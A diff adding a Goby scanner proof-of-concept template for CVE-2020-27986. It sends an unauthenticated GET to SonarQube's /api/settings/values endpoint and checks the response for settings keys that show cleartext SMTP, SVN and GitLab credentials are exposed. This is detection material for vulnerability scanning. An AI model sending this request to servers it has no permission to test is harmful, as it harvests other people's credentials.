@@ -1,0 +1,69 @@
+{
+      "Name": "SonarQube unauth CVE-2020-27986",
+      "Level": "3",
+      "Tags": [
+            "unauth"
+      ],
+      "GobyQuery": "app=\"SonarQube\"",
+      "Description": "SonarQube 8.4.2.36762 allows remote attackers to discover cleartext SMTP, SVN, and GitLab credentials via the api/settings/values URI.",
+      "Product": "SonarQube",
+      "Homepage": "https://www.sonarqube.org/",
+      "Author": "aetkrad",
+      "Impact": "",
+      "Recommendation": "",
+      "References": [
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27986"
+      ],
+      "HasExp": false,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/api/settings/values",
+                        "follow_redirect": false,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "sonaranalyzer-cs.nuget.packageVersion",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "sonar.core.id",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|"
+                  ]
+            }
+      ],
+      "PostTime": "2021-11-29 15:03:58",
+      "GobyVersion": "1.9.310"
+}
